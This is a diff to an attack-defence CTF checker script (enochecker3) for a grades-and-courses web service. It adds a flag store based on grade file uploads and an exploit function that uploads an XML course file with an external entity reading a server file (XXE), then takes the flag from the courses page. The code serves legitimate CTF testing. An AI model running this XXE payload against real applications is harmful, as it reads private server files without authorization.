@@ -1,4 +1,5 @@
 from bs4 import BeautifulSoup
+import io
 
 from enochecker3 import (
     ChainDB,
@@ -45,7 +46,7 @@ def app():
 """
 Utility functions
 """
-# TODO: add utility functions here
+
 
 random.seed(int.from_bytes(os.urandom(16), "little"))
 alphabet = string.ascii_letters + string.digits
@@ -85,9 +86,42 @@ def assert_status_code(
         raise MumbleException(errmsg)
 
 
+def parse_filename(text: str):
+    soup = BeautifulSoup(text, "html.parser")
+    last_li = soup.find("li")
+    if last_li:
+        filename = last_li.text.split("\n")[1].strip()
+        return filename
+    else:
+        raise MumbleException("No grade filename found")
+
+
+def parse_filecontent(text: str):
+    soup = BeautifulSoup(text, "html.parser")
+    last_li = soup.find("li")
+    if last_li:
+        filename = last_li.text.split("\n")[3].strip()
+        return filename
+    else:
+        raise MumbleException("No grade filecontent found")
+
+
+def generate_xxe_payload(filename: str):
+    return (f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY xxe SYSTEM "file:///service/grades/{filename}">
+]>
+<data>
+    <course>
+        <name>Malicious Course</name>
+        <description>&xxe;</description>
+    </course>
+</data>""")
+
 """
 Checker functions
 """
+
 
 @checker.putflag(0)
 async def putflag_db(
@@ -142,6 +176,57 @@ async def getflag_db(
     assert_in(task.flag, flag, "Flag missing")
 
 
+@checker.putflag(1)
+async def putflag_db(
+    task: PutflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB,
+) -> str:
+    # register user and login
+    username, password = noise(10, 15), noise(16, 20)
+    data = {"username": username, "password": password}
+    r = await client.post("/index.php?action=register", data=data)
+    assert_status_code(logger, r, 302, "Register failed", info=data)
+
+    # create the grade file
+    file_obj = io.BytesIO(task.flag.encode())
+
+    # post grade
+    r = await client.post("/index.php?action=grades", files={"grades": file_obj})
+    assert_status_code(logger, r, 201, "Post Grade Grade failed", info=data)
+    filename = parse_filename(r.text)
+    if not filename:
+        raise MumbleException("Filename missing")
+
+    await db.set("info", (username, password))
+
+    return f"User {username} Uploaded Grade {filename}"  # This is attack info
+
+
+@checker.getflag(1)
+async def getflag_db(
+    task: GetflagCheckerTaskMessage,
+    logger: LoggerAdapter,
+    client: AsyncClient,
+    db: ChainDB,
+) -> None:
+    try:
+        username, password = await db.get("info")
+    except KeyError:
+        raise MumbleException("database entry missing")
+
+    data = {"username": username, "password": password}
+    r = await client.post("/index.php?action=login", data=data)
+    assert_status_code(logger, r, 302, "Login failed", info=data)
+
+    r = await client.get(f"/index.php?action=grades")
+    assert_status_code(logger, r, 200, "Access grades failed")
+    flag = parse_filecontent(r.text)
+
+    assert_in(task.flag, flag, "Flag missing")
+
+
 @checker.exploit(0)
 async def exploit_mass_assign(
     task: ExploitCheckerTaskMessage,
@@ -172,6 +257,43 @@ async def exploit_mass_assign(
     # get flag
     r = await client.get(f"/index.php?action=profile&id={flaguser_id}")
     assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
+    flag = searcher.search_flag(r.text)
+    if flag is not None:
+        return flag
+
+
+@checker.exploit(1)
+async def exploit_xxe(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+) -> Optional[str]:
+    assert_equals(type(task.attack_info), str, "attack info missing")
+
+    assert_equals(len(task.attack_info.split()), 5)
+
+    # Attack info is in the form of "User {username} Uploaded Grade {filename}"
+    _, _, _, _, filename = task.attack_info.split()
+
+    # register user and login
+    username, password = noise(10, 15), noise(16, 20)
+    data = {"username": "exploiter_" + username, "password": "pass"}
+    r = await client.post("/index.php?action=register", data=data)
+    assert_status_code(logger, r, 302, "Register failed", info=data)
+
+    # exploit xxe in course upload
+    files = {
+        "title": (None, "Malicious Course"),
+        "course_data": ("exploit4.xml", io.BytesIO(generate_xxe_payload(filename).encode()), "text/xml"),
+        "is_private": (None, "on"),
+    }
+    r = await client.post("/index.php?action=courses", files=files)
+    assert_status_code(logger, r, 201, "Upload Course failed", info=data)
+
+    # get flag
+    r = await client.get(f"/index.php?action=courses")
+    assert_status_code(logger, r, 200, "Courses Missing", info=data)
     flag = searcher.search_flag(r.text)
     if flag is not None:
         return flag
